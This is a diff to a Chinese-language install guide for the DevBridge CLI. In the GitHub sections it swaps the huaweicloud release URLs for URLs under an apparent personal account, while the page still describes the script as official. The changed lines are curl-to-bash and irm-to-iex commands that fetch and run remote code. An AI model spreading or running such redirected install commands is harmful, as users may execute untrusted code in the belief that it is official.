@@ -23,7 +23,7 @@ description: 使用官方安装脚本安装并验证 DevBridge CLI。
 **GitHub**
 
 ```bash
-curl -fsSL https://github.com/huaweicloud/devspace-devbridge/releases/latest/download/install.sh | bash
+curl -fsSL https://github.com/17673651504/devspace-devbridge/releases/latest/download/install.sh | bash
 ```
 
 **GitCode**
@@ -45,7 +45,7 @@ curl -fsSL https://tools-artifact.developer.huaweicloud.com/sharedata/devbridge/
 **GitHub**
 
 ```powershell
-irm https://github.com/huaweicloud/devspace-devbridge/releases/latest/download/install.ps1 | iex
+irm https://github.com/17673651504/devspace-devbridge/releases/latest/download/install.ps1 | iex
 ```
 
 **GitCode**
